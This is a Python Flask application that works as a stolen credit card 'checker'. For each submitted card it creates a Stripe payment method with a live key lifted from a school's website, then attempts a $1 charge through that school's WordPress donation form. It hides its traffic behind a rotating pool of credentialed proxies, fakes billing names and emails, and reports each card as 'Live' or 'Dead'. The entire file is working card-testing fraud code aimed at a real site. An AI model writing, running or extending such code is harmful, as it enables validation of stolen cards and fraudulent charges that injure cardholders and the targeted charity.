from flask import Flask, request, jsonify, send_from_directory
import requests
import random
import time
import uuid
import os
import json
from datetime import datetime

app = Flask(__name__, static_folder='public', static_url_path='')

# Configuration
ADMIN_NAME = "Moas osas"
GATEWAY_URL = "https://texassouthernacademy.com/wp-admin/admin-ajax.php"
STRIPE_PM_URL = "https://api.stripe.com/v1/payment_methods"
PUBLIC_KEY = "pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d"

# Proxy Pool
PROXY_LIST = [
"31.59.20.176:6754:devtronex:devtronexop",
"23.95.150.145:6114:devtronex:devtronexop",
"198.23.239.134:6540:devtronex:devtronexop",
"45.38.107.97:6014:devtronex:devtronexop",
"107.172.163.27:6543:devtronex:devtronexop",
"198.105.121.200:6462:devtronex:devtronexop",
"64.137.96.74:6641:devtronex:devtronexop",
"216.10.27.159:6837:devtronex:devtronexop",
"23.26.71.145:5628:devtronex:devtronexop",
"23.229.19.94:8689:devtronex:devtronexop"
]

def get_random_proxy():
    """Get a random proxy from the pool in requests format."""
    proxy_str = random.choice(PROXY_LIST)
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, password = parts
        proxy_url = f"http://{user}:{password}@{ip}:{port}"
        return {
            'http': proxy_url,
            'https': proxy_url
        }
    return None

def get_bin_info(cc):
    try:
        response = requests.get(f"https://lookup.binlist.net/{cc[:6]}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                "scheme": data.get("scheme", "N/A"),
                "type": data.get("type", "N/A"),
                "brand": data.get("brand", "N/A"),
                "country": data.get("country", {}).get("name", "N/A"),
                "bank": data.get("bank", {}).get("name", "N/A")
            }
    except:
        pass
    return {"scheme": "N/A", "type": "N/A", "brand": "N/A", "country": "N/A", "bank": "N/A"}

@app.route('/')
def index():
    return send_from_directory(app.static_folder, 'index.html')

@app.route('/api/check', methods=['POST'])
def check_card():
    card_data = request.json.get('card')
    if not card_data:
        return jsonify({'success': False, 'message': 'No card data provided'}), 400

    start_time = time.time()
    log_id = str(uuid.uuid4())[:8]
    
    try:
        # 1. Parse Card
        parts = card_data.split('|')
        if len(parts) != 4:
            return jsonify({'success': False, 'message': 'Invalid format. Use CC|MM|YY|CVV'}), 400
        
        cc, mm, yy, cvv = parts
        yy = yy[-2:] if len(yy) == 4 else yy
        
        # Log parsing
        print(f"[{datetime.now()}] [{log_id}] Initiating check for {cc[:6]}******{cc[-4:]}")
        
        # 2. Get BIN Info
        bin_info = get_bin_info(cc)
        
        # 3. Step 1: Stripe Payment Method
        stripe_headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
        }
        
        # Dynamic IDs for Stripe
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())
        guid = str(uuid.uuid4())
        
        stripe_payload = (
            f'type=card&billing_details[name]={ADMIN_NAME}&card[number]={cc}&card[cvc]={cvv}'
            f'&card[exp_month]={mm}&card[exp_year]={yy}&guid={guid}&muid={muid}&sid={sid}'
            f'&payment_user_agent=stripe.js%2Fc59f9dfd6e%3B+stripe-js-v3%2Fc59f9dfd6e%3B+card-element'
            f'&key={PUBLIC_KEY}'
        )
        
        print(f"[{datetime.now()}] [{log_id}] Step 1: Creating Stripe Payment Method...")
        
        # Get random proxy
        proxies = get_random_proxy()
        
        response1 = requests.post(STRIPE_PM_URL, headers=stripe_headers, data=stripe_payload, proxies=proxies, timeout=15)
        
        if response1.status_code != 200:
            error_msg = response1.json().get('error', {}).get('message', 'Tokenization Failed')
            return jsonify({
                'success': False,
                'status': 'Dead',
                'message': error_msg,
                'bin': bin_info,
                'time': f"{time.time() - start_time:.2f}s"
            })
        
        pm_id = response1.json().get('id')
        print(f"[{datetime.now()}] [{log_id}] Step 1 Success: PM_ID={pm_id}")
        
        # Small human-like delay
        time.sleep(random.uniform(0.5, 1.2))

        # 4. Step 2: Texas Southern Academy Charge
        charge_headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://texassouthernacademy.com',
            'referer': 'https://texassouthernacademy.com/donation/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        # Critical: Add Stripe Identity Cookies for Step 2
        charge_cookies = {
            '__stripe_mid': muid,
            '__stripe_sid': sid
        }
        
        email = f"user_{random.randint(1000, 9999)}@hmao.com"
        
        charge_payload = {
            'action': 'wp_full_stripe_inline_donation_charge',
            'wpfs-form-name': 'donate',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount': 'other',
            'wpfs-custom-amount-unique': '1.00',
            'wpfs-donation-frequency': 'one-time',
            'wpfs-billing-name': ADMIN_NAME,
            'wpfs-billing-address-country': 'US',
            'wpfs-billing-address-line-1': '69 Adams Street',
            'wpfs-billing-address-city': 'Brooklyn',
            'wpfs-billing-address-state-select': 'NY',
            'wpfs-billing-address-zip': '11201',
            'wpfs-card-holder-email': email,
            'wpfs-card-holder-name': ADMIN_NAME,
            'wpfs-custom-amount-index': '0',
            'wpfs-stripe-payment-method-id': pm_id
        }
        
        print(f"[{datetime.now()}] [{log_id}] Step 2: Hitting Charity Gateway...")
        response2 = requests.post(GATEWAY_URL, headers=charge_headers, data=charge_payload, cookies=charge_cookies, proxies=proxies, timeout=20)
        
        # Log status code
        print(f"[{datetime.now()}] [{log_id}] Step 2 Status: {response2.status_code}")
        
        try:
            res_json = response2.json()
            # Handle deep validation errors in message
            if 'fieldErrors' in res_json.get('bindingResult', {}):
                errors = res_json['bindingResult']['fieldErrors'].get('errors', [])
                message = errors[0].get('message') if errors else str(res_json)
            else:
                message = res_json.get('message') or res_json.get('error') or str(res_json)
                
            is_success = res_json.get('success', False)
        except:
            message = response2.text[:100].replace('\n', ' ')
            is_success = False
            
        print(f"[{datetime.now()}] [{log_id}] Step 2 Result: {message}")
        
        status = "Live" if is_success or "charged" in message.lower() or "success" in message.lower() else "Dead"
        
        # 5. Build Final Response
        total_time = f"{time.time() - start_time:.2f}s"
        
        return jsonify({
            'success': True,
            'status': status,
            'message': message,
            'bin': bin_info,
            'time': total_time,
            'log_id': log_id
        })

    except Exception as e:
        print(f"[{datetime.now()}] [{log_id}] ERROR: {str(e)}")
        return jsonify({
            'success': False,
            'status': 'Error',
            'message': f"Internal Error: {str(e)}"
        }), 500

if __name__ == '__main__':
    if not os.path.exists('public'):
        os.makedirs('public')
    app.run(debug=True, host='0.0.0.0', port=5000)
